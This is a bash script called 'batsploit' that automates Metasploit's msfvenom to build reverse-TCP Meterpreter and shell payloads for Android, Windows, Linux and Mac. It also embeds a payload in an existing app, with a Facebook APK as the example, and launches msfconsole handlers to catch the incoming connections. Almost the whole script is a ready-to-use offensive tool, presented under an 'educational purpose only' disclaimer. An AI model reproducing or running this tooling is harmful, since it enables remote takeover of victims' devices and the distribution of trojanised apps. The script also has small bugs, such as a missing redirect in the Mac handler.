#!/bin/bash

########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
# Created By: TheTechHacker            #
########################################


mkdir Payloads
mkdir rc

clear

GREEN='\033[1;32m'
COLOR='\e[0m'

echo -e "$GREEN====================================================================$COLOR"
echo -e "$GREEN  ______________$COLOR"
echo -e "$GREEN <   batsploit   >$COLOR"
echo -e "$GREEN  -------------- $COLOR"
echo -e "$GREEN   __      ___  _____       ____$COLOR"
echo -e "$GREEN   ) \     / (   )   \     /   ($COLOR"
echo -e "$GREEN  )_  \_V_/  _(   )_  \_V_/  _($COLOR"
echo -e "$GREEN    )__   __(       )__   __($COLOR"
echo -e "$GREEN       '-'             '-'$COLOR"
echo -e ""
echo -e "$GREEN--------------------------------------------------------------------$COLOR"
echo -e "$GREEN                 Created By: TheTechHacker                          $COLOR"
echo -e "$GREEN SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ$COLOR"
echo -e "$GREEN             Payloads will be saved in /batsploit/Paloads           $COLOR"
echo -e "$GREEN--------------------------------------------------------------------$COLOR"


echo -e "$GREEN====================================================================$COLOR"

echo " "

echo -e "$GREEN 1)Android $COLOR"
echo -e "$GREEN 2)Windows $COLOR"
echo -e "$GREEN 3)Linux $COLOR"
echo -e "$GREEN 4)Mac $COLOR"
echo -e "$GREEN 5)Listen $COLOR"
echo -e "$GREEN 6)exit $COLOR"
echo -e "$GREEN "

read -p "ENTER> " LINUX

echo -e "$COLOR"

android(){
 echo -e "$GREEN"
 read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
 echo "Generating Payload"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > Payloads/droid.apk
 echo " "
 echo "droid.apk saved to /batsploit/Payloads"
 echo -e "$COLOR"


 return
}

windows(){
 echo -e "$GREEN"
 read -p "LHOST=" LHOST; read -p "LPORT= " LPORT
 echo "Generating Payload"
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > Payloads/win.exe
 echo " "
 echo "win.exe saved to /batsploit/Payloads"
 echo -e "$COLOR"

 return
}

linux(){
 echo -e "$GREEN"
 read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
 echo "Generating Payload"
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > Payloads/linux.elf
 echo " "
 echo "linux.elf saved to /batsploit/Payloads"
 echo -e "$COLOR"

 return
}

mac(){
 echo -e "$GREEN"
 read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
 echo "Generating Payload"
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho > Payloads/mac.macho
 echo " "
 echo "mac.macho saved to /batsploit/Payloads"
 echo -e "$COLOR"

 return
}

apk(){
 echo -e "$GREEN"
 read -p "Original apk= " BURGER; read -p "LHOST= " LHOST; read -p "LPORT= " LPORT; read -p "New apk= " APP
 echo "Generating Payload"
 msfvenom -x $BURGER -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $APP
 echo -e "$COLOR"

return
}

if [ "$LINUX" == "5" ];
then
 clear
 echo -e "$GREEN "
 echo "1)Android"
 echo "2)Windows"
 echo "3)Linux"
 echo "4)Mac"
 echo " "
 read -p "ENTER> " EXPLOIT
 echo -e "$COLOR"

fi

case $EXPLOIT in
 1)echo -e "$GREEN"
   rm rc/android.rc
   clear
   echo "========================"
   echo "        ANDROID         "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   touch rc/android.rc
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   echo use exploit/multi/handler >> rc/android.rc
   echo set payload android/meterpreter/reverse_tcp >> rc/android.rc
   echo set LHOST $LHOST >> rc/android.rc
   echo set LPORT $LPORT >> rc/android.rc
   echo exploit >> rc/android.rc
   echo "Accessing Metasploit... "
   msfconsole -r rc/android.rc
   echo -e "$COLOR"
;;

 2)echo -e "$GREEN"
   rm rc/windows.rc
   clear
   echo "========================"
   echo "        WINDOWS         "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   touch windows.rc >> rc/windows.rc
   echo use exploit/multi/handler >> rc/windows.rc
   echo set payload windows/meterpreter/reverse_tcp >> rc/windows.rc
   echo set LHOST $LHOST >> rc/windows.rc
   echo set LPORT $LPORT >> rc/windows.rc
   echo exploit >> rc/windows.rc
   echo "Accessing Metasploit... "
   msfconsole -r rc/windows.rc
   echo "$COLOR"
 ;;

 3)echo -e "$GREEN"
   rm rc/linux.rc
   clear
   echo "========================"
   echo "        LINUX           "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   touch rc/linux.rc
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   echo use exploit/multi/handler >> rc/linux.rc
   echo set payload linux/x86/meterpreter/reverse_tcp >> rc/linux.rc
   echo set LHOST $LHOST >> rc/linux.rc
   echo set LPORT $LPORT >> rc/linux.rc
   echo exploit >> rc/linux.rc
   echo "Accessing Metasploit... "
   msfconsole -r rc/linux.rc
   echo -e "$COLOR"
 ;;

 4)echo -e "$GREEN"
   rm rc/mac.rc
   clear
   echo "========================"
   echo "          MAC           "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   touch rc/mac.rc
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   echo use exploit/multi/handler >> rc/mac.rc
   echo set payload osx/x86/shell_reverse_tcp >> rc/mac.rc
   echo set LHOST $LHOST >> rc/mac.rc
   echo set LPORT $LPORT >> rc/mac.rc
   echo exploit
   echo "Accessing Metasploit... "
   msfconsole -r rc/mac.rc
   echo -e "$COLOR"
 ;;

 *)echo -e "$GREEN"
   echo "Invalid option"
   echo -e "$COLOR"

 ;;

esac


if [ "$LINUX" == "1" ];
then
 clear
 echo -e "$GREEN===============================$COLOR"
 echo -e "$GREEN            Android            $COLOR"
 echo -e "$GREEN 1)Bind payload to original apk$COLOR"
 echo -e "$GREEN 2)Generate Payload            $COLOR"
 echo -e "$GREEN===============================$COLOR"
 echo -e " "
 echo -e "$GREEN 1)bind payload to apk$COLOR"
 echo -e "$GREEN 2)Generate payload$COLOR"
 echo -e "$GREEN 3)Back$COLOR"
 echo -e "$GREEN "
 read -p "Enter> " MSF
 echo -e "$COLOR"

fi

if [ "$MSF" == "1" ];
then
 clear
 echo -e "$GREEN=============================================================$COLOR"
 echo -e "$GREEN              Created By: TheTechHacker                      $COLOR"
 echo -e "$GREEN Example Original apk path:/root/Desktop/Facebook.apk        $COLOR"
 echo -e "$GREEN         LHOST= YOUR IP                                      $COLOR"
 echo -e "$GREEN         LPORT=YOUR PORT                                     $COLOR"
 echo -e "$GREEN Example New apk:/root/Desktop/Example.apk                   $COLOR"
 echo -e "$GREEN=============================================================$COLOR"
 echo "  "
 apk 

fi

if [ "$MSF" == "2" ];
then
 clear
 echo -e "$GREEN==================================$COLOR"
 echo -e "$GREEN       Created By: TheTechHacker  $COLOR"
 echo -e "$GREEN         LHOST=YOUR IP            $COLOR"
 echo -e "$GREEN         LPORT=YOUR PORT          $COLOR"
 echo -e "$GREEN==================================$COLOR"
 android

fi

if [ "$MSF" = "3" ];
then
 clear
 ./venom.sh

fi

if [ "$LINUX" = "2" ];
then
 clear
 echo -e "$GREEN========================$COLOR"
 echo -e "$GREEN          Windows       $COLOR"
 echo -e "$GREEN       LHOST=YOUR IP    $COLOR"
 echo -e "$GREEN       LPORT=YOUR PORT  $COLOR"
 echo -e "$GREEN========================$COLOR"
 echo " "
 windows

fi

if [ "$LINUX" = "3" ];
then
 clear
 echo -e "$GREEN========================$COLOR"
 echo -e "$GREEN         Linux          $COLOR"
 echo -e "$GREEN      LHOST=YOUR IP     $COLOR"
 echo -e "$GREEN      LPORT=YOUR PORT   $COLOR"
 echo -e "$GREEN========================$COLOR"
 echo " "
 linux

fi

if [ "$LINUX" = "4" ];
then
 clear
 echo -e "$GREEN===============================$COLOR"
 echo -e "$GREEN              Mac              $COLOR"
 echo -e "$GREEN         LHOST=YOUR IP         $COLOR"
 echo -e "$GREEN         LPORT=YOUR PORT       $COLOR"
 echo -e "$GREEN===============================$COLOR"
 echo " "
 mac

fi


if [ "$LINUX" = "6" ];
then
 clear
 exit

fi


